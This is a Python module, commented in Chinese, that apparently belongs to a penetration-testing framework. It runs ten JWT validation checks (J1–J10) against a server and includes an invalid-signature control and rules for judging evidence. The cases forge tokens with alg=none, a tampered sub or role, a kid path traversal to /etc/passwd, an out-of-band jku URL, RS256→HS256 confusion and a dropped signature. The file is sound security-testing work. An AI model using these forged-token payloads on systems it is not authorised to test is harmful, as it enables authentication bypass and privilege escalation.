"""B9 认证清单（20）：J1–J10 全量变体 + O/M/S 检查单 + 覆盖矩阵。

三条取証纪律写进代码，不写进文档：
1. **200 不是证据**——变体必须带回"只有该身份才看得到"的标记字段；
2. **必须有 control（无效签名被拒）**——否则"什么都放行"会被误判成漏洞；
3. **token 只存摘要**（alg、claim 名、签名长度与前缀），签名原文永不入证据。

J 系列全部用既有 8 种 Transform 表达（20 §2.2）：不新增 kind，不把"怎么伪造"
塞进框架——那是 oracle 的域知识。
"""

from __future__ import annotations

import base64
import json
from dataclasses import dataclass
from typing import Any

from pydantic import BaseModel, ConfigDict

from veripen_core.models import ImpactClass, Judgement, Verdict

from ..common.base import BaseOracle, OracleMeta, transform, variant
from ..common.harness import Pair, Variant

# ══════════════════════════════════════════════════════════════════
# JWT 结构工具（纯函数，不联网、不验签——验签是服务器的事）
# ══════════════════════════════════════════════════════════════════
_ALG_NONE = "none"


def b64d(segment: str) -> dict[str, Any]:
    pad = "=" * (-len(segment) % 4)
    try:
        return dict(json.loads(base64.urlsafe_b64decode(segment + pad)))
    except Exception:
        return {}


def b64e(obj: dict[str, Any]) -> str:
    raw = json.dumps(obj, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def split_token(token: str) -> tuple[str, str, str]:
    parts = token.split(".")
    if len(parts) != 3:
        return (token, "", "")
    return parts[0], parts[1], parts[2]


def token_summary(token: str) -> dict[str, Any]:
    """③ 取证要求：只留摘要，**签名原文不存**（20 §2.1 / 06 §4）。"""
    header_seg, payload_seg, sig = split_token(token)
    header = b64d(header_seg)
    payload = b64d(payload_seg)
    return {
        "alg": header.get("alg"),
        "header_keys": sorted(header),
        "claim_names": sorted(payload),
        "signature": {"len": len(sig), "prefix": sig[:6]} if sig else {"len": 0, "prefix": ""},
    }


def forge(base_token: str, *, header: dict[str, Any] | None = None,
          payload: dict[str, Any] | None = None, drop_signature: bool = False,
          keep_signature: bool = True) -> str:
    """按给定补丁重拼 token。只在内存里，用于构造变体。"""
    header_seg, payload_seg, sig = split_token(base_token)
    head = {**b64d(header_seg), **(header or {})}
    body = {**b64d(payload_seg), **(payload or {})}
    out_sig = "" if drop_signature else sig
    if not keep_signature:
        out_sig = sig + "AA" if sig else ""
    return f"{b64e(head)}.{b64e(body)}.{out_sig}"


# ══════════════════════════════════════════════════════════════════
# J 系列：J1–J10（20 §2）
# ══════════════════════════════════════════════════════════════════
@dataclass(frozen=True)
class JCase:
    """一个 J 测试点：怎么改 header/payload/signature，以及靠什么字段判。"""

    id: str
    title: str
    header: dict[str, Any] | None = None
    payload: dict[str, Any] | None = None
    drop_signature: bool = False
    mangle_signature: bool = False
    #: 变体必须带回的"身份标记字段"（缺它 → INCONCLUSIVE，不是 VERIFIED）
    marker: str = "sub"
    marker_value: str | None = None
    note: str = ""


class JwtParams(BaseModel):
    model_config = ConfigDict(extra="forbid")
    repeat: int = 2
    subject: str = "secondary"
    escalate_to: str = "primary"
    escalate_role: str = "admin"
    #: 过期/未来时间距离（秒），J7/J8 用
    clock_skew_s: int = 3600


class JwtSuite(BaseOracle):
    """J1–J10 一次性跑完：每条独立判，报告里分开写（20 §4：混在一起是外行报告）。"""

    params_model = JwtParams
    baseline_uses_token = True

    meta = OracleMeta(
        id="jwt_suite",
        version="1.0.0",
        cwe="CWE-347",
        impact=ImpactClass.READ_ONLY,
        severity_rule="token_validation_defect",
        selector_tags=("protected_read",),
        requires=("auth:primary", "token:real"),
    )

    def baseline_params(self, binding: Any) -> dict[str, str]:
        return {}

    def baseline_ok(self, trace: Any) -> bool:
        # 基线必须真的读到"这个人"的数据，否则后面所有标记字段都无处对照
        return trace.is_normal() and b'"sub"' in trace.body

    def cases(self) -> list[JCase]:
        p = self.params
        skew = int(getattr(p, "clock_skew_s", 3600))
        return [
            JCase("J1", "alg=none 可接受", header={"alg": _ALG_NONE}, drop_signature=True),
            JCase("J2", "签名未校验（改 payload 保签名）",
                  payload={"sub": str(getattr(p, "escalate_to", "primary"))}),
            JCase("J3", "sub 可篡改提权",
                  payload={"sub": str(getattr(p, "escalate_to", "primary"))},
                  marker_value=str(getattr(p, "escalate_to", "primary"))),
            JCase("J4", "role/scope 可篡改",
                  payload={"role": str(getattr(p, "escalate_role", "admin"))},
                  marker="role", marker_value=str(getattr(p, "escalate_role", "admin"))),
            JCase("J5", "kid 注入", header={"kid": "../../../../etc/passwd"}, marker="sub"),
            JCase("J6", "jku 外联", header={"jku": "{{ref:OOB_URL}}/{{nonce}}"}, marker="sub"),
            JCase("J7", "exp 未校验", payload={"exp": 1, "iat": 1}, marker="sub"),
            JCase("J8", "nbf/iat 未校验",
                  payload={"nbf": 4102444800, "iat": 4102444800}, marker="sub"),
            JCase("J9", "算法混淆 RS256→HS256", header={"alg": "HS256"}, marker="sub"),
            JCase("J10", "无签名段（两段式）", drop_signature=True, marker="sub"),
        ]

    def plan(self, binding: Any) -> list[Variant]:
        """骨架要求 ≥1 control：无效签名的探针就是对照（证明服务器确实验签）。"""
        plans = [
            variant(
                f"case_{c.id.lower()}",
                "probe",
                expect="accepted_or_rejected",
                tf=transform("replace", arg=c.id, target="header", note=c.title),
                headers={
                    "Authorization": _slot(
                        {
                            "header": c.header or {},
                            "payload": c.payload or {},
                            "drop_signature": c.drop_signature,
                        }
                    )
                },
            )
            for c in self.cases()
        ]
        # 对照只有一条：无效签名。J 变体里"被拒"的那些不承担对照职责。
        plans.append(
            variant(
                "invalid_signature",
                "control",
                expect="deny",
                tf=transform("replace", arg="bad", target="header", note="无效签名（证明真的验签）"),
                headers={"Authorization": _slot({"mangle_signature": True})},
            )
        )
        return plans

    def judge(self, pairs: list[Pair]) -> Judgement:
        by_name = {p.variant.name: p for p in pairs}
        control = by_name.get("invalid_signature")
        if control is None:
            return self.inconclusive("missing_variant")

        control_denied = control.trace.status in (401, 403)
        cases = {f"case_{c.id.lower()}": c for c in self.cases()}
        accepted: dict[str, str] = {}
        inconclusive: dict[str, str] = {}

        for name, pair in by_name.items():
            case = cases.get(name)
            if case is None:
                continue
            if pair.trace.status not in (200, 201, 204):
                continue
            marker = _marker_hit(pair, case)
            if marker is None:
                # 200 但不是证据：拿不到"只有该身份才看得到"的字段（20 §2.1）
                inconclusive[name] = "no_discriminating_field"
                continue
            accepted[name] = marker

        assertion = {
            "kind": "jwt_suite",
            "statement": "无效签名被拒，但以下变体被接受并返回了身份标记字段",
            "expected": {"probe_status": [200], "control_status": [401, 403]},
            "observed": {
                "accepted": sorted(accepted),
                "accepted_markers": accepted,
                "inconclusive": inconclusive,
                "control_status": control.trace.status,
                "control_denied": control_denied,
            },
            "fingerprint": {"control_denied": control_denied, "any_accepted": bool(accepted)},
        }
        if not control_denied:
            # 服务器对无效签名也放行 → 无法证明它在验签，不能出洞
            return self.refuted("control_not_denied", assertion)
        if accepted:
            return self.verified("token_validation_defect", assertion, 0.9)
        if inconclusive:
            return self.inconclusive("no_discriminating_field", assertion)
        return self.refuted("all_variants_rejected", assertion)

    # ── 取证：标记字段 ──────────────────────────────────────────
    @staticmethod
    def _sent_token(pair: Pair) -> dict[str, Any]:  # pragma: no cover - 调试用
        return dict(pair.sent)


def _slot(plan: dict[str, Any]) -> str:
    """把补丁包成 ``Bearer {{jwt:{...}}}``；占位符内部是 **JSON 本身**，外面只有一层 ``}}``。"""
    body = json.dumps(plan, ensure_ascii=False, sort_keys=True)
    return "Bearer " + "{{jwt:" + body + "}}"


def _marker_hit(pair: Pair, case: JCase) -> str | None:
    """变体响应里是否出现"只有该身份才看得到"的字段。

    J3 用目标身份、J4 用角色；其余用基线已有的 sub（同一个人但伪造成功）。
    """
    body = pair.trace.body
    if case.marker_value is not None:
        needle = json.dumps(case.marker_value).encode()
        if b'"' + case.marker.encode() + b'": ' + needle in body:
            return f"{case.marker}={case.marker_value}"
        return None
    if b'"' + case.marker.encode() + b'":' in body:
        return case.marker
    return None


__all__ = [
    "JCase",
    "JwtParams",
    "JwtSuite",
    "b64d",
    "b64e",
    "forge",
    "split_token",
    "token_summary",
]
